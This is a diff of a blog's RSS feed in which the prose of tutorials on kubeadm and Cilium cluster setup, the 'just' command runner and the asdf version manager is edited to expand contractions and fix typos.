 <span data-line=""><span style="color:#F69D50">8322192c4605c</span><span style="color:#96D0FF">       bd8cc6d582470</span><span style="color:#6CB6FF">       36</span><span style="color:#96D0FF"> seconds</span><span style="color:#96D0FF"> ago</span><span style="color:#96D0FF">      Running</span><span style="color:#96D0FF">             kube-proxy</span><span style="color:#6CB6FF">                4</span><span style="color:#96D0FF">                   344c4f7fffbe8</span><span style="color:#96D0FF">       kube-proxy-drm46</span></span>
@@ -2382,7 +2382,7 @@ and running.  If it isn't you can check:</p>
 <p>which will show you pods that have exited. You can grab the container ID for
 kube-apiserver and read its logs:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> crictl</span><span style="color:#6CB6FF"> --runtime-endpoint=unix:///var/run/containerd/containerd.sock</span><span style="color:#96D0FF"> logs</span><span style="color:#96D0FF"> 10432b81d7c61</span></span></code></pre></figure>
-<p>There are a few ways to figure out why the node isn’t ready yet.  Usually I would check the
+<p>There are a few ways to figure out why the node is not ready yet.  Usually I would check the
 <code>kubelet</code> logs first:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> journalctl</span><span style="color:#6CB6FF"> -flu</span><span style="color:#96D0FF"> kubelet</span></span>
 <span data-line=""><span style="color:#F69D50">--</span><span style="color:#96D0FF"> Logs</span><span style="color:#96D0FF"> begin</span><span style="color:#96D0FF"> at</span><span style="color:#96D0FF"> Sun</span><span style="color:#96D0FF"> 2022-04-17</span><span style="color:#96D0FF"> 19:22:19</span><span style="color:#96D0FF"> AST.</span><span style="color:#6CB6FF"> --</span></span>
@@ -2395,10 +2395,10 @@ going on is describing the node:</p>
 might see something useful.  In this case under <code>Lease</code> you would see:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> describe</span><span style="color:#96D0FF"> node</span><span style="color:#96D0FF"> controlplane</span><span style="color:#F47067">|</span><span style="color:#F69D50">grep</span><span style="color:#96D0FF"> NotReady</span></span>
 <span data-line=""><span style="color:#F69D50">Ready</span><span style="color:#96D0FF">            False</span><span style="color:#96D0FF">   Sun,</span><span style="color:#6CB6FF"> 17</span><span style="color:#96D0FF"> Apr</span><span style="color:#6CB6FF"> 2022</span><span style="color:#96D0FF"> 20:53:37</span><span style="color:#6CB6FF"> -0400</span><span style="color:#96D0FF">   Sun,</span><span style="color:#6CB6FF"> 17</span><span style="color:#96D0FF"> Apr</span><span style="color:#6CB6FF"> 2022</span><span style="color:#96D0FF"> 20:43:07</span><span style="color:#6CB6FF"> -0400</span><span style="color:#96D0FF">   KubeletNotReady</span><span style="color:#96D0FF">              container</span><span style="color:#96D0FF"> runtime</span><span style="color:#96D0FF"> network</span><span style="color:#96D0FF"> not</span><span style="color:#96D0FF"> ready:</span><span style="color:#96D0FF"> NetworkReady=</span><span style="color:#6CB6FF">false</span><span style="color:#96D0FF"> reason:NetworkPluginNotReady</span><span style="color:#96D0FF"> message:Network</span><span style="color:#96D0FF"> plugin</span><span style="color:#96D0FF"> returns</span><span style="color:#96D0FF"> error:</span><span style="color:#96D0FF"> cni</span><span style="color:#96D0FF"> plugin</span><span style="color:#96D0FF"> not</span><span style="color:#96D0FF"> initialize</span></span></code></pre></figure>
-<p>Lets get our CNI installed, we’ll be using cilium!</p>
+<p>Let us get our CNI installed, we will be using cilium!</p>
 <h2>Setting up your CNI!</h2>
 <p>Cilium has great documentation over <a href="https://docs.cilium.io/en/v1.9/gettingstarted/k8s-install-kubeadm/">here</a>,
-but I’ll walk you through it anyways.  I do recommend checking out their documentation so you
+but I will walk you through it anyways.  I do recommend checking out their documentation so you
 are familiar with it.   We will use <code>helm</code> to pull down the version of cilium we want:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> curl</span><span style="color:#6CB6FF"> -fsSL</span><span style="color:#96D0FF">  https://baltocdn.com/helm/signing.asc</span><span style="color:#F47067"> |</span><span style="color:#F69D50"> sudo</span><span style="color:#96D0FF"> gpg</span><span style="color:#6CB6FF"> --dearmor</span><span style="color:#6CB6FF"> -o</span><span style="color:#96D0FF"> /etc/apt/trusted.gpg.d/helm.gpg</span></span>
 <span data-line=""> </span>
@@ -2409,7 +2409,7 @@ are familiar with it.   We will use <code>helm</code> to pull down the version o
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> apt-get</span><span style="color:#96D0FF"> update</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> apt-get</span><span style="color:#96D0FF"> install</span><span style="color:#96D0FF"> helm</span></span></code></pre></figure>
 <p>Now we can install cilium!  It is <em>very</em> important that you pay attention to the
-compatibility of cilium with the version of kubernetes you are intstalling. Check
+compatibility of cilium with the version of kubernetes you are installing. Check
 the compatibility list <a href="https://docs.cilium.io/en/v1.12/concepts/kubernetes/compatibility/">here</a>.</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> helm</span><span style="color:#96D0FF"> repo</span><span style="color:#96D0FF"> add</span><span style="color:#96D0FF"> cilium</span><span style="color:#96D0FF"> https://helm.cilium.io/</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> helm</span><span style="color:#96D0FF"> repo</span><span style="color:#96D0FF"> update</span></span></code></pre></figure>
@@ -2432,8 +2432,8 @@ the compatibility list <a href="https://docs.cilium.io/en/v1.12/concepts/kuberne
 <p>Time to join our worker to the cluster!</p>
 <h2>Joining a worker to the cluster!</h2>
 <p>We have to go through the same steps as the controlplane to get the point that we have a
-container runtime and <code>kubeadm</code>.   I’m not going to talk about the commands a second time but
-I’ll re-iterate them here for ease of following along.</p>
+container runtime and <code>kubeadm</code>.   I am not going to talk about the commands a second time but
+I will re-iterate them here for ease of following along.</p>
 <p>First open up another shell and connect to the worker:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> multipass</span><span style="color:#96D0FF"> shell</span><span style="color:#96D0FF"> worker</span></span></code></pre></figure>
 <p>Now run the following commands:</p>
@@ -2478,14 +2478,14 @@ I’ll re-iterate them here for ease of following along.</p>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> apt-get</span><span style="color:#96D0FF"> install</span><span style="color:#96D0FF"> kubeadm=1.23.5-00</span><span style="color:#96D0FF"> kubelet=1.23.5-00</span><span style="color:#96D0FF"> kubectl=1.23.5-00</span><span style="color:#6CB6FF"> -y</span></span>
 <span data-line=""> </span></code></pre></figure>
 <p>From there we should be ready to join the cluster.   When we ran <code>kubeadm init</code> previously it
-printed a join command out that we could use but I’m going to show you how to do it if you
+printed a join command out that we could use but I am going to show you how to do it if you
 were coming back later and no longer had that token.</p>
 <p>Back on the <em>controplane</em> node run:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubeadm</span><span style="color:#96D0FF"> token</span><span style="color:#96D0FF"> create</span><span style="color:#6CB6FF"> --print-join-command</span></span>
 <span data-line=""><span style="color:#F69D50">kubeadm</span><span style="color:#96D0FF"> join</span><span style="color:#96D0FF"> 192.168.64.7:6443</span><span style="color:#6CB6FF"> --token</span><span style="color:#96D0FF"> wxs197.cco6mjj9ricvu8ov</span><span style="color:#6CB6FF"> --discovery-token-ca-cert-hash</span><span style="color:#96D0FF"> sha256:bd01c065240fa76f30a02ecb70a8cea6e329c9678994d4da1f6ccac7694b97fb</span></span></code></pre></figure>
 <p>Now copy that command and run it with <code>sudo</code> on the worker:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> kubeadm</span><span style="color:#96D0FF"> join</span><span style="color:#96D0FF"> 192.168.64.7:6443</span><span style="color:#6CB6FF"> --token</span><span style="color:#96D0FF"> wxs197.cco6mjj9ricvu8ov</span><span style="color:#6CB6FF"> --discovery-token-ca-cert-hash</span><span style="color:#96D0FF"> sha256:bd01c065240fa76f30a02ecb70a8cea6e329c9678994d4da1f6ccac7694b97fb</span></span></code></pre></figure>
-<p>After this completes it’ll take a minute or two for everything to be synced up but if you go
+<p>After this completes it will take a minute or two for everything to be synced up but if you go
 back to the master node you should have 2 ready nodes now:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> nodes</span></span>
 <span data-line=""><span style="color:#F69D50">NAME</span><span style="color:#96D0FF">           STATUS</span><span style="color:#96D0FF">   ROLES</span><span style="color:#96D0FF">                  AGE</span><span style="color:#96D0FF">   VERSION</span></span>
@@ -2495,7 +2495,7 @@ back to the master node you should have 2 ready nodes now:</p>
 <p>Now the final part is to get the <code>admin.conf</code> as a kubeconfig on your machine so you can control
 it from outside of the cluster.   To do this we can use scp</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">multipass</span><span style="color:#96D0FF"> transfer</span><span style="color:#96D0FF"> controlplane:/home/ubuntu/.kube/config</span><span style="color:#96D0FF"> local.config</span></span></code></pre></figure>
-<p>Normally kubernetes configuration is in ~/.kube/config but I like to maint a separate file for
+<p>Normally kubernetes configuration is in ~/.kube/config but I like to maintain a separate file for
 each cluster and then I set the <code>KUBECONFIG</code> env var to access it.</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> export</span><span style="color:#96D0FF"> KUBECONFIG=local.config</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> nodes</span></span>
@@ -2520,8 +2520,8 @@ on the project.  Things like:</p>
 <p>The reason I think this is important is because it makes a nice consistent and discoverable
 entrypoint for understanding how you should work in the project.   If you only provide the
 instructions in the <code>README</code> then you have to remember to update those docs every time you
-add a new command.  Those docs aren't easily testable either.</p>
-<p>Most of my career the command runner of choice for my projects as been <code>GNU Make</code> but it was
+add a new command.  Those docs are not easily testable either.</p>
+<p>Most of my career the command runner of choice for my projects has been <code>GNU Make</code> but it was
 definitely the wrong tool for the job.  It is a build tool that I bent into shape to work
 as a command runner for me.   These days I use the tool <a href="https://github.com/casey/just">just</a>.</p>
 <h2>Intro to just</h2>
@@ -2535,20 +2535,20 @@ at the root of your project and then the basic syntax is:</p>
 <span data-line=""><span style="color:#DCBDFB">first</span><span style="color:#ADBAC7">:</span></span>
 <span data-line=""><span style="color:#ADBAC7">  echo "Any commands you want to run go here!"</span></span></code></pre></figure>
 <p>The first <code>help</code> line defines a command "help" for your CLI and it lists out all the other available
-commans.  I always put this line first because <code>just</code> runs the first command in the file if a specific
-command isn't requested.  The output of this file looks like this:</p>
+commands.  I always put this line first because <code>just</code> runs the first command in the file if a specific
+command is not requested.  The output of this file looks like this:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> just</span></span>
 <span data-line=""><span style="color:#F69D50">Available</span><span style="color:#96D0FF"> recipes:</span></span>
 <span data-line=""><span style="color:#F69D50">    first</span><span style="color:#768390"> # My first command</span></span>
 <span data-line=""><span style="color:#F69D50">    help</span></span></code></pre></figure>
-<p>Having help automatically generated is fantastic!  Its also really helpful that it adds the comment
-to the command so that each command is self-documenting.  If you run the <code>first</code> command you'll notice
+<p>Having help automatically generated is fantastic!  It is also really helpful that it adds the comment
+to the command so that each command is self-documenting.  If you run the <code>first</code> command you will notice
 it also has a feature where it prints out the commands being ran so the user knows exactly what is
 happening:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> just</span><span style="color:#96D0FF"> first</span></span>
 <span data-line=""><span style="color:#6CB6FF">echo</span><span style="color:#96D0FF"> "Any commands you want to run go here!"</span></span>
 <span data-line=""><span style="color:#F69D50">Any</span><span style="color:#96D0FF"> commands</span><span style="color:#96D0FF"> you</span><span style="color:#96D0FF"> want</span><span style="color:#96D0FF"> to</span><span style="color:#96D0FF"> run</span><span style="color:#96D0FF"> go</span><span style="color:#96D0FF"> here!</span></span></code></pre></figure>
-<p>This doesn't always make sense though, so you can quickly remove that behavior by putting an <code>@</code> in front
+<p>This does not always make sense though, so you can quickly remove that behavior by putting an <code>@</code> in front
 of any of the commands, like I did for the <code>help</code> command above.  You can also declare dependencies if
 you have re-usable parts of your workflow that many of your commands need.</p>
 <p>For example, you might want to check versions of things like <code>node</code> and <code>python</code> before running the install
@@ -2579,7 +2579,7 @@ of their dependencies. So you could do something like:</p>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> just</span><span style="color:#96D0FF"> install</span></span>
 <span data-line=""><span style="color:#F69D50">Missing</span><span style="color:#96D0FF"> node</span><span style="color:#96D0FF"> version:</span><span style="color:#96D0FF"> v17.6.0</span></span>
 <span data-line=""><span style="color:#F69D50">error:</span><span style="color:#96D0FF"> Recipe</span><span style="color:#96D0FF"> `</span><span style="color:#F69D50">check-dependencies</span><span style="color:#96D0FF">`</span><span style="color:#F69D50"> failed</span><span style="color:#96D0FF"> on</span><span style="color:#96D0FF"> line</span><span style="color:#6CB6FF"> 12</span><span style="color:#96D0FF"> with</span><span style="color:#96D0FF"> exit</span><span style="color:#96D0FF"> code</span><span style="color:#6CB6FF"> 1</span></span></code></pre></figure>
-<p>This opens up a lot of possibilities! In the above <code>justfile</code> you'll notice I'm using a multi-line
+<p>This opens up a lot of possibilities! In the above <code>justfile</code> you will notice I am using a multi-line
 command but I have <code>\</code> at the end of each line.  This is because <code>just</code> by default is going to run
 each new line in their own shell.   So this just makes all those lines run in the same shell.</p>
 <p>You do not have to use this syntax though.  Just is <code>polyglot</code> and can run commands from any language
@@ -2595,7 +2595,7 @@ you would like.</p>
 <span data-line=""><span style="color:#ADBAC7">    exit 1</span></span>
 <span data-line=""><span style="color:#ADBAC7">  fi</span></span></code></pre></figure>
 <p>Now the entire command is using a bash script to execute! This gets really interesting if you want to start
-using things like python, so if you'd like to change the dependency checker above to python:</p>
+using things like python, so if you would like to change the dependency checker above to python:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="python" data-theme="github-dark-dimmed"><code data-language="python" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#ADBAC7">check</span><span style="color:#F47067">-</span><span style="color:#ADBAC7">dependencies:</span></span>
 <span data-line=""><span style="color:#768390">  #!/usr/bin/env python3</span></span>
 <span data-line=""><span style="color:#F47067">  import</span><span style="color:#ADBAC7"> subprocess</span></span>
@@ -2613,7 +2613,7 @@ using things like python, so if you'd like to change the dependency checker abov
 backticks!  So something like:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="make" data-theme="github-dark-dimmed"><code data-language="make" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#ADBAC7">`print("Rust is the best programming language")`</span></span></code></pre></figure>
 <p>It would run through python instead of the shell.</p>
-<h3>Enviornment Files</h3>
+<h3>Environment Files</h3>
 <p>One of the other modern things <code>just</code> adds to your workflow is the ability to utilize dotenv
 files.  So for example if you want to define which port you launch your http server on, you can
 create a file called <code>.env</code>:</p>
@@ -2624,10 +2624,10 @@ create a file called <code>.env</code>:</p>
 <span data-line=""><span style="color:#DCBDFB">http</span><span style="color:#ADBAC7">:</span></span>
 <span data-line=""><span style="color:#ADBAC7">  @echo "Starting webserver in current directory"</span></span>
 <span data-line=""><span style="color:#ADBAC7">  python3 -m http.server </span><span style="color:#6CB6FF">$W</span><span style="color:#ADBAC7">EBSERVER_PORT</span></span></code></pre></figure>
-<p>When you run <code>just http</code> it'll launch the http server on port 9000.  One important line
+<p>When you run <code>just http</code> it will launch the http server on port 9000.  One important line
 in this file is <code>set dotenv-load</code>, it will not load the <code>.env</code> file without you telling it to.</p>
-<h2>Don't use language specific scripts!</h2>
-<p>I'n not a fan of language specific command runners like <code>package.json</code> in the node community.</p>
+<h2>Do not use language specific scripts!</h2>
+<p>I am not a fan of language specific command runners like <code>package.json</code> in the node community.</p>
 <p>It always frustrates me when I start working on a project that heavily uses <code>scripts</code> in their
 package.json instead of using a real command runner. <code>json</code> is not a great format for writing
 discoverable CLI commands. For example if you wanted to write a <code>next.js</code> build script:</p>
@@ -2650,7 +2650,7 @@ discoverable CLI commands. For example if you wanted to write a <code>next.js</c
 <span data-line=""><span style="color:#F69D50">      next</span><span style="color:#96D0FF"> export</span><span style="color:#6CB6FF"> -o</span><span style="color:#96D0FF"> dist/</span></span>
 <span data-line=""><span style="color:#F69D50">   -</span><span style="color:#96D0FF"> predeploy</span></span>
 <span data-line=""><span style="color:#F69D50">      yarn</span><span style="color:#96D0FF"> build</span><span style="color:#ADBAC7"> &#x26;&#x26; </span><span style="color:#F69D50">yarn</span><span style="color:#96D0FF"> export</span><span style="color:#ADBAC7"> &#x26;&#x26; </span><span style="color:#F69D50">touch</span><span style="color:#96D0FF"> dist/.nojekyll</span><span style="color:#ADBAC7"> &#x26;&#x26; </span><span style="color:#6CB6FF">echo</span><span style="color:#96D0FF"> sontek.net</span><span style="color:#F47067"> ></span><span style="color:#96D0FF"> dist/CNAME</span></span></code></pre></figure>
-<p>I'd much rather have this:</p>
+<p>I would much rather have this:</p>
 <pre><code>❯ just
 Available recipes:
     build       # Build frontend assets
@@ -2659,8 +2659,8 @@ Available recipes:
 </code></pre>
 <h2>Conclusion</h2>
 <p><a href="https://github.com/casey/just">Just</a> is a wonderful tool for building project specific CLIs without much effort. It is
-a great replacement for <code>Make</code> if you are using it as a command runner and it has most of the features you'd need.</p>
-<p>I recommend adding a <code>justfile</code> to your projects today! If you'd like to see a real world example of how to use <code>just</code>,
+a great replacement for <code>Make</code> if you are using it as a command runner and it has most of the features you would need.</p>
+<p>I recommend adding a <code>justfile</code> to your projects today! If you would like to see a real world example of how to use <code>just</code>,
 you can check out the one I use to maintain my <a href="https://github.com/sontek/homies/blob/master/justfile">home directory</a>!</p>]]></description>
             <link>https://sontek.net/blog/2022/intro_to_just</link>
             <guid isPermaLink="true">https://sontek.net/blog/2022/intro_to_just</guid>
@@ -2675,9 +2675,9 @@ of plugins.</p>
 <p>With micro-services being all the rage and the ever changing landscape
 of the development world, it is rare to utilize a single version of
 language runtime. Even when you want to upgrade from one to the other
-you'll need both usable on your system at the same time.</p>
-<p>I've used tools like <code>pyenv</code> and <code>nvm</code> in the past when I needed to change
-versions depending on which project I'm contributing to. But with <code>asdf</code>
+you will need both usable on your system at the same time.</p>
+<p>I have used tools like <code>pyenv</code> and <code>nvm</code> in the past when I needed to change
+versions depending on which project I am contributing to. But with <code>asdf</code>
 you have one tool to rule them all!</p>
 <h2>Getting Started</h2>
 <p>The first thing you need to do when working with <code>asdf</code> is grab the
@@ -2691,13 +2691,13 @@ what plugins are available:</p>
 <span data-line=""><span style="color:#F69D50">python</span><span style="color:#6CB6FF">                       *</span><span style="color:#96D0FF">https://github.com/danhper/asdf-python.git</span></span>
 <span data-line=""><span style="color:#F69D50">yarn</span><span style="color:#6CB6FF">                         *</span><span style="color:#96D0FF">https://github.com/twuni/asdf-yarn.git</span></span></code></pre></figure>
 <p>On the left will be the name of the plugin and on the right will be the repository
-where it lives.  It'll me marked with an asterisk if you already have it installed.</p>
+where it lives.  It will be marked with an asterisk if you already have it installed.</p>
 <p>To install a plugin you say <code>asdf plugin add &#x3C;plugin></code> to get it installed.  You can
 also provide the repository where you want it pulled from, for example:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F47067">></span><span style="color:#ADBAC7"> asdf plugin add nodejs https://github.com/asdf-vm/asdf-nodejs.git</span></span>
 <span data-line=""><span style="color:#F47067">></span><span style="color:#ADBAC7"> asdf plugin add python https://github.com/danhper/asdf-python.git</span></span></code></pre></figure>
 <p>This will not give you any version of those languages, it is only installing the
-plugin that knows how to work with those languages.   You are ready to pull down
+plugin that knows how to work with those languages.  You are ready to pull down
 any versions you want at that point:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F47067">></span><span style="color:#ADBAC7"> asdf install nodejs 14.19.0</span></span>
 <span data-line=""><span style="color:#F47067">></span><span style="color:#ADBAC7"> asdf install python 3.9.10</span></span></code></pre></figure>
@@ -2718,9 +2718,9 @@ any versions you want at that point:</p>
 <span data-line=""><span style="color:#F69D50">yarn</span></span>
 <span data-line=""><span style="color:#F69D50">  1.22.17</span></span></code></pre></figure>
 <h2>Using the installed languages</h2>
-<p>To activate a specific version of a language you have you have three options:</p>
+<p>To activate a specific version of a language you have three options:</p>
 <h3>Make it global</h3>
-<p>You can make it global, meaning when you run the tool like <code>python</code> it'll use
+<p>You can make it global, meaning when you run the tool like <code>python</code> it will use
 this version for the system:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F47067">></span><span style="color:#ADBAC7"> asdf global python 3.9.10</span></span></code></pre></figure>
 <h3>Make it local</h3>
@@ -2747,7 +2747,7 @@ ever wonder what versions a directory is using you can run:</p>
 <span data-line=""><span style="color:#F69D50">python</span><span style="color:#6CB6FF">          3.9.10</span><span style="color:#96D0FF">          .tool-versions</span></span>
 <span data-line=""><span style="color:#F69D50">yarn</span><span style="color:#6CB6FF">            1.22.17</span><span style="color:#96D0FF">         .tool-versions</span></span></code></pre></figure>
 <h2>Conclusion</h2>
-<p><a href="https://asdf-vm.com/">asdf</a>  is an AWESOME tool to utilize if you find yourself using many
+<p><a href="https://asdf-vm.com/">asdf</a> is an AWESOME tool to utilize if you find yourself using many
 different languages or many different versions of the same language. You should check it out
 and see if it can improve your workflow.</p>]]></description>
             <link>https://sontek.net/blog/2022/intro_to_asdf</link>
